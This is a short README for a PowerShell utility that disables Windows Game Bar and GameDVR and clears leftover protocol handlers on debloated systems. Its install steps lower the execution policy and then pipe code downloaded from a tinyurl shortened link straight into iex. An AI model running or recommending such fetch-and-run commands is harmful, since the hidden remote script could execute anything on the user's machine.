\# Remove GameBar Prompts



A small utility script that disables Game Bar, GameDVR and removes leftover protocol handlers (`ms-gamebar`, `ms-gamingoverlay`, etc.) responsible for the \*\*“can’t open / no application associated”\*\* pop‑ups when launching games on debloated Windows installations.



This is especially useful on systems modified by debloat scripts such as \*Unfuck‑Windows10\*, where Game Bar UWP packages are removed but protocol registrations remain.



---



\## Commands



\### Enable external script execution (required once)

```powershell

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

```



\###Download and execute the script

```powershell

iex (\[System.Net.WebClient]::new().DownloadString('https://tinyurl.com/jntnkent'))

```

